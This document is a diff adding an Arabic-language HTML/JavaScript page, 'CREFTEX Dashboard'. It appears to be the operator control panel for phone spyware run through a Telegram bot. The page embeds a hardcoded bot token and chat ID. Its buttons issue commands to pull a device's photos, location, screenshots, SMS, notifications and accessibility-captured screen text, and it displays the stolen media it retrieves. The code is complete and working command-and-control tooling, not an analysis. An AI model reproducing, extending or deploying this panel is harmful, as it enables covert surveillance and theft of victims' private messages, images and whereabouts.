@@ -1,0 +1,576 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#0a0f1a">
+    <title>CREFTEX Dashboard</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>⚡</text></svg>">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; -webkit-tap-highlight-color: transparent; }
+        body {
+            background: radial-gradient(ellipse at top, #0f172a 0%, #050810 60%);
+            color: #e8eef8;
+            min-height: 100vh;
+            padding: 16px;
+            padding-bottom: 40px;
+        }
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+        }
+
+        /* Header */
+        .header {
+            text-align: center;
+            margin-bottom: 24px;
+            padding: 20px 16px;
+            background: linear-gradient(135deg, rgba(59, 130, 246, 0.1), rgba(6, 182, 212, 0.05));
+            border: 1px solid rgba(59, 130, 246, 0.2);
+            border-radius: 20px;
+            position: relative;
+            overflow: hidden;
+        }
+        .header::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: conic-gradient(from 0deg, transparent, rgba(59, 130, 246, 0.15), transparent 30%);
+            animation: rotate 8s linear infinite;
+        }
+        @keyframes rotate { to { transform: rotate(360deg); } }
+        .header-inner { position: relative; z-index: 1; }
+        h1 {
+            font-size: 26px;
+            font-weight: 800;
+            margin-bottom: 6px;
+            background: linear-gradient(135deg, #60a5fa, #06b6d4, #22d3ee);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .subtitle { color: #94a3b8; font-size: 13px; }
+
+        /* Status Bar */
+        .status {
+            padding: 12px 16px;
+            margin-bottom: 18px;
+            border-radius: 12px;
+            font-size: 14px;
+            font-weight: 600;
+            display: none;
+            text-align: center;
+        }
+        .status.show { display: block; animation: slideDown 0.3s ease; }
+        @keyframes slideDown { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
+        .status.ok { background: rgba(16, 185, 129, 0.15); color: #34d399; border: 1px solid rgba(16, 185, 129, 0.3); }
+        .status.err { background: rgba(239, 68, 68, 0.15); color: #f87171; border: 1px solid rgba(239, 68, 68, 0.3); }
+        .status.wait { background: rgba(59, 130, 246, 0.15); color: #60a5fa; border: 1px solid rgba(59, 130, 246, 0.3); }
+
+        /* Panel */
+        .panel {
+            background: rgba(15, 23, 42, 0.8);
+            border: 1px solid rgba(71, 85, 105, 0.3);
+            border-radius: 16px;
+            padding: 18px;
+            margin-bottom: 16px;
+            backdrop-filter: blur(12px);
+        }
+        .panel-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 14px;
+        }
+        .panel-title {
+            font-size: 16px;
+            font-weight: 700;
+            color: #93c5fd;
+        }
+        .refresh-btn {
+            background: rgba(59, 130, 246, 0.15);
+            border: 1px solid rgba(59, 130, 246, 0.3);
+            color: #60a5fa;
+            padding: 6px 14px;
+            border-radius: 8px;
+            font-size: 12px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.15s;
+        }
+        .refresh-btn:active { transform: scale(0.95); }
+
+        /* Stats */
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+        }
+        .stat {
+            background: rgba(30, 41, 59, 0.6);
+            padding: 14px 8px;
+            border-radius: 12px;
+            text-align: center;
+            border: 1px solid rgba(71, 85, 105, 0.2);
+        }
+        .stat .num {
+            font-size: 22px;
+            font-weight: 800;
+            color: #22d3ee;
+            line-height: 1.2;
+        }
+        .stat .lbl {
+            font-size: 11px;
+            color: #94a3b8;
+            margin-top: 4px;
+        }
+
+        /* Buttons Grid */
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+        }
+        .btn {
+            padding: 16px 12px;
+            border-radius: 12px;
+            border: none;
+            font-size: 14px;
+            font-weight: 700;
+            color: #fff;
+            cursor: pointer;
+            transition: transform 0.1s, opacity 0.15s, box-shadow 0.2s;
+            background: linear-gradient(135deg, #3b82f6, #2563eb);
+            box-shadow: 0 4px 14px rgba(59, 130, 246, 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            min-height: 52px;
+            text-align: center;
+        }
+        .btn:active { transform: scale(0.96); box-shadow: 0 2px 8px rgba(59, 130, 246, 0.4); }
+        .btn.secondary { background: linear-gradient(135deg, #6366f1, #4f46e5); box-shadow: 0 4px 14px rgba(99, 102, 241, 0.3); }
+        .btn.green { background: linear-gradient(135deg, #10b981, #059669); box-shadow: 0 4px 14px rgba(16, 185, 129, 0.3); }
+        .btn.orange { background: linear-gradient(135deg, #f59e0b, #d97706); box-shadow: 0 4px 14px rgba(245, 158, 11, 0.3); }
+        .btn.danger { background: linear-gradient(135deg, #ef4444, #dc2626); box-shadow: 0 4px 14px rgba(239, 68, 68, 0.3); }
+        .btn.purple { background: linear-gradient(135deg, #8b5cf6, #7c3aed); box-shadow: 0 4px 14px rgba(139, 92, 246, 0.3); }
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+
+        /* Chat Log */
+        .log {
+            background: #050810;
+            border-radius: 12px;
+            padding: 14px;
+            max-height: 500px;
+            overflow-y: auto;
+            font-size: 13px;
+            line-height: 1.6;
+            direction: ltr;
+            border: 1px solid rgba(71, 85, 105, 0.2);
+        }
+        .log::-webkit-scrollbar { width: 4px; }
+        .log::-webkit-scrollbar-track { background: rgba(30, 41, 59, 0.3); border-radius: 2px; }
+        .log::-webkit-scrollbar-thumb { background: #3b82f6; border-radius: 2px; }
+
+        .msg {
+            padding: 10px 12px;
+            margin-bottom: 8px;
+            border-radius: 10px;
+            background: rgba(30, 41, 59, 0.5);
+            border-left: 3px solid #3b82f6;
+            animation: fadeIn 0.3s ease;
+        }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(4px); } to { opacity: 1; transform: translateY(0); } }
+        .msg.bot { border-left-color: #06b6d4; background: rgba(6, 182, 212, 0.08); }
+        .msg.user { border-left-color: #10b981; background: rgba(16, 185, 129, 0.08); }
+        .msg.error { border-left-color: #ef4444; background: rgba(239, 68, 68, 0.08); }
+
+        .msg-time { color: #64748b; font-size: 11px; margin-bottom: 4px; direction: rtl; }
+        .msg-from { color: #93c5fd; font-weight: 700; font-size: 12px; direction: rtl; }
+        .msg-text {
+            color: #e2e8f0;
+            direction: rtl;
+            text-align: right;
+            margin-top: 6px;
+            white-space: pre-wrap;
+            word-break: break-word;
+            font-size: 13px;
+        }
+        .msg-img {
+            max-width: 100%;
+            border-radius: 8px;
+            margin-top: 8px;
+            display: block;
+            border: 1px solid rgba(71, 85, 105, 0.3);
+        }
+        .msg-video {
+            max-width: 100%;
+            border-radius: 8px;
+            margin-top: 8px;
+            display: block;
+        }
+
+        .empty {
+            text-align: center;
+            color: #64748b;
+            padding: 40px 20px;
+            font-size: 14px;
+            direction: rtl;
+        }
+        .empty-icon { font-size: 48px; margin-bottom: 12px; opacity: 0.5; }
+
+        /* Spinner */
+        .spinner {
+            display: inline-block;
+            width: 14px;
+            height: 14px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+            vertical-align: middle;
+            margin-left: 6px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* Auto-refresh indicator */
+        .auto-indicator {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 11px;
+            color: #64748b;
+            margin-top: 10px;
+            justify-content: center;
+        }
+        .dot {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background: #10b981;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+
+        /* Modal for full image */
+        .modal {
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.95);
+            z-index: 9999;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .modal.show { display: flex; }
+        .modal img { max-width: 100%; max-height: 90vh; border-radius: 12px; }
+        .modal-close {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: rgba(255,255,255,0.1);
+            border: none;
+            color: #fff;
+            font-size: 24px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <div class="header-inner">
+                <h1>⚡ CREFTEX</h1>
+                <div class="subtitle">لوحة التحكم عن بُعد</div>
+            </div>
+        </div>
+
+        <!-- Status -->
+        <div class="status" id="status"></div>
+
+        <!-- Stats -->
+        <div class="panel">
+            <div class="panel-header">
+                <div class="panel-title">📊 الإحصائيات</div>
+            </div>
+            <div class="stats">
+                <div class="stat">
+                    <div class="num" id="statUpdates">0</div>
+                    <div class="lbl">تحديثات</div>
+                </div>
+                <div class="stat">
+                    <div class="num" id="statPhotos">0</div>
+                    <div class="lbl">صور</div>
+                </div>
+                <div class="stat">
+                    <div class="num" id="statLast" style="font-size:14px">—</div>
+                    <div class="lbl">آخر فحص</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Commands -->
+        <div class="panel">
+            <div class="panel-header">
+                <div class="panel-title">🎛 الأوامر السريعة</div>
+            </div>
+            <div class="grid">
+                <button class="btn" onclick="sendCmd('/menu')">📋 القائمة</button>
+                <button class="btn secondary" onclick="sendCmd('/photos')">📸 كل الصور</button>
+                <button class="btn secondary" onclick="sendCmd('/photos 50')">📸 آخر 50</button>
+                <button class="btn green" onclick="sendCmd('/info')">📊 معلومات الجهاز</button>
+                <button class="btn green" onclick="sendCmd('/location')">📍 الموقع</button>
+                <button class="btn orange" onclick="sendCmd('/screen')">📷 لقطة شاشة</button>
+                <button class="btn purple" onclick="sendCmd('/sms')">📩 SMS</button>
+                <button class="btn purple" onclick="sendCmd('/notifs')">🔔 الإشعارات</button>
+                <button class="btn secondary" onclick="sendCmd('/accessibility')">📝 نصوص الشاشة</button>
+                <button class="btn danger" onclick="sendCmd('/screen_stop')">🛑 إيقاف اللقطات</button>
+            </div>
+        </div>
+
+        <!-- Chat -->
+        <div class="panel">
+            <div class="panel-header">
+                <div class="panel-title">💬 الرسائل</div>
+                <button class="refresh-btn" onclick="loadUpdates(true)">🔄 تحديث</button>
+            </div>
+            <div class="log" id="logBox">
+                <div class="empty">
+                    <div class="empty-icon">📭</div>
+                    لا رسائل بعد — اضغط تحديث
+                </div>
+            </div>
+            <div class="auto-indicator">
+                <div class="dot"></div>
+                <span>تحديث تلقائي كل 10 ثواني</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal for full image -->
+    <div class="modal" id="imgModal" onclick="closeModal()">
+        <button class="modal-close" onclick="closeModal()">×</button>
+        <img id="modalImg" src="" alt="">
+    </div>
+
+    <script>
+        // ============================================
+        //  إعدادات البوت
+        // ============================================
+        const TELEGRAM_BOT_TOKEN = "8965774628:AAHiRk5BzVgGXJOMURMJyNNjHnpDj7MUAjM";
+        const TELEGRAM_CHAT_ID = "8599240795";
+
+        const API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
+        const FILE_API = `https://api.telegram.org/file/bot${TELEGRAM_BOT_TOKEN}`;
+
+        let lastUpdateId = 0;
+        let photoCount = 0;
+        let sentMessageIds = new Set();
+
+        // ============================================
+        //  إرسال أمر للبوت
+        // ============================================
+        async function sendCmd(cmd) {
+            showStatus(`⏳ جاري إرسال: ${cmd}`, 'wait');
+            try {
+                const res = await fetch(`${API}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: cmd
+                    })
+                });
+                const data = await res.json();
+                if (data.ok) {
+                    showStatus(`✅ تم الإرسال: ${cmd}`, 'ok');
+                    // اسحب الرد بعد 2 ثانية
+                    setTimeout(() => loadUpdates(true), 2000);
+                } else {
+                    showStatus(`❌ فشل: ${data.description}`, 'err');
+                }
+            } catch (e) {
+                showStatus(`❌ خطأ: ${e.message}`, 'err');
+            }
+        }
+
+        // ============================================
+        //  جلب التحديثات من البوت
+        // ============================================
+        async function loadUpdates(showLoading) {
+            if (showLoading) {
+                document.getElementById('statLast').textContent = 'فحص...';
+            }
+
+            try {
+                // نجلب من البداية (offset=0) لو أول مرة — لنجلب كل الرسائل
+                const offset = lastUpdateId === 0 ? 0 : lastUpdateId + 1;
+                const res = await fetch(`${API}/getUpdates?offset=${offset}&limit=100`);
+                const data = await res.json();
+
+                if (!data.ok) {
+                    showStatus(`❌ فشل الجلب: ${data.description}`, 'err');
+                    return;
+                }
+
+                const logBox = document.getElementById('logBox');
+                const updates = data.result || [];
+
+                // أول مرة → امسح
+                if (lastUpdateId === 0) {
+                    logBox.innerHTML = '';
+                }
+
+                if (updates.length === 0 && lastUpdateId === 0) {
+                    logBox.innerHTML = `
+                        <div class="empty">
+                            <div class="empty-icon">📭</div>
+                            لا رسائل بعد — أرسل أمرًا للبوت أولًا
+                        </div>
+                    `;
+                    document.getElementById('statLast').textContent = '—';
+                    return;
+                }
+
+                for (const u of updates) {
+                    lastUpdateId = Math.max(lastUpdateId, u.update_id);
+                    const msg = u.message || u.edited_message || u.channel_post;
+                    if (msg) renderMessage(msg);
+                }
+
+                document.getElementById('statUpdates').textContent = lastUpdateId;
+                document.getElementById('statLast').textContent = new Date().toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit' });
+
+                // scroll to bottom
+                logBox.scrollTop = logBox.scrollHeight;
+
+            } catch (e) {
+                showStatus(`❌ خطأ الشبكة: ${e.message}`, 'err');
+            }
+        }
+
+        // ============================================
+        //  عرض رسالة
+        // ============================================
+        function renderMessage(msg) {
+            // منع التكرار
+            if (sentMessageIds.has(msg.message_id)) return;
+            sentMessageIds.add(msg.message_id);
+
+            const logBox = document.getElementById('logBox');
+
+            // إزالة "لا رسائل بعد" إن وجدت
+            const emptyDiv = logBox.querySelector('.empty');
+            if (emptyDiv) emptyDiv.remove();
+
+            const from = msg.from?.first_name || 'Unknown';
+            const isBot = msg.from?.is_bot || false;
+            const time = new Date(msg.date * 1000).toLocaleString('ar-EG', {
+                hour: '2-digit', minute: '2-digit', day: '2-digit', month: '2-digit'
+            });
+
+            const item = document.createElement('div');
+            item.className = 'msg ' + (isBot ? 'bot' : 'user');
+
+            let content = `
+                <div class="msg-time">${time}</div>
+                <div class="msg-from">${isBot ? '🤖 ' : '👤 '}${escapeHtml(from)}</div>
+            `;
+
+            if (msg.photo && msg.photo.length > 0) {
+                // صورة — استخدم أكبر حجم
+                const fileId = msg.photo[msg.photo.length - 1].file_id;
+                const caption = msg.caption || '';
+                content += `<div class="msg-text">📸 صورة${caption ? ' — ' + escapeHtml(caption) : ''}</div>`;
+                content += `<img class="msg-img" data-file="${fileId}" alt="photo" onclick="openModal(this.src)">`;
+                photoCount++;
+                document.getElementById('statPhotos').textContent = photoCount;
+            } else if (msg.video) {
+                const fileId = msg.video.file_id;
+                content += `<div class="msg-text">🎥 فيديو${msg.caption ? ' — ' + escapeHtml(msg.caption) : ''}</div>`;
+                content += `<video class="msg-video" controls data-file="${fileId}"></video>`;
+            } else if (msg.document) {
+                content += `<div class="msg-text">📎 ملف: ${escapeHtml(msg.document.file_name || 'ملف')}</div>`;
+            } else if (msg.audio) {
+                const fileId = msg.audio.file_id;
+                content += `<div class="msg-text">🎤 صوتي</div>`;
+                content += `<audio controls data-file="${fileId}"></audio>`;
+            } else if (msg.text) {
+                const text = msg.text;
+                content += `<div class="msg-text">${escapeHtml(text)}</div>`;
+            } else {
+                content += `<div class="msg-text">—</div>`;
+            }
+
+            item.innerHTML = content;
+            logBox.appendChild(item);
+
+            // جلب الملفات (صور، فيديو، صوت)
+            const mediaEl = item.querySelector('[data-file]');
+            if (mediaEl) loadMedia(mediaEl.getAttribute('data-file'), mediaEl);
+        }
+
+        // ============================================
+        //  جلب ملف من Telegram
+        // ============================================
+        async function loadMedia(fileId, el) {
+            try {
+                const res = await fetch(`${API}/getFile?file_id=${fileId}`);
+                const data = await res.json();
+                if (data.ok && data.result.file_path) {
+                    el.src = `${FILE_API}/${data.result.file_path}`;
+                } else {
+                    el.alt = 'فشل تحميل الصورة';
+                }
+            } catch (e) {
+                console.error('media load err', e);
+            }
+        }
+
+        // ============================================
+        //  Modal للصورة
+        // ============================================
+        function openModal(src) {
+            const m = document.getElementById('imgModal');
+            const img = document.getElementById('modalImg');
+            img.src = src;
+            m.classList.add('show');
+        }
+        function closeModal() {
+            document.getElementById('imgModal').classList.remove('show');
+        }
+
+        // ============================================
+        //  Helpers
+        // ============================================
+        function showStatus(msg, type) {
+            const s = document.getElementById('status');
+            s.textContent = msg;
+            s.className = 'status show ' + type;
+            clearTimeout(window.__statusTm);
+            window.__statusTm = setTimeout(() => s.classList.remove('show'), 4000);
+        }
+
+        function escapeHtml(s) {
+            return String(s).replace(/[&<>"']/g, c => ({
+                '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
+            }[c]));
+        }
+
+        // ============================================
+        //  التشغيل
+        // ============================================
+        loadUpdates();
+        setInterval(() => loadUpdates(false), 10000);
+    </script>
+</body>
+</html>
